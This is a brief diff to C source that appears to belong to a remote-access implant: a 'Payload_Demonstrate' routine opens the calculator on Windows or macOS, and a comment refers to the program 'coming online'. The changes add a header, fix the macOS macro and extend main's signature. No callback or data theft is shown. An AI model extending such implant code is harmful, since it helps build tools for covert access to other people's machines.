@@ -36,6 +36,7 @@
     #include <signal.h>
     #include <fcntl.h>
     #include <sys/select.h>
+    #include <spawn.h>
 #ifndef MSG_NOSIGNAL
     #define MSG_NOSIGNAL 0
 #endif
@@ -301,7 +302,7 @@ int Payload_Demonstrate(void) {
         ShellExecute(NULL, NULL, "calc.exe", NULL, NULL, SW_SHOWNORMAL);
     }
 
-#elif defined(_APPLE)
+#elif defined(__APPLE__)
     // macOS(Darwin) 实现：通过posix_spawn来打开 Calculator.app，避免弹出终端窗口
     pid_t pid;
     extern char **environ;
@@ -319,7 +320,7 @@ int Payload_Demonstrate(void) {
 }
 
 // --- 主程序入口 ---
-int main(int argc, char *argv[]) {
+int main(int argc, char *argv[], char *envp[]) {
     // 成功上线演示提示(可根据需要注释掉或取消注释)
 	// Payload_Demonstrate();
 #ifndef _WIN32
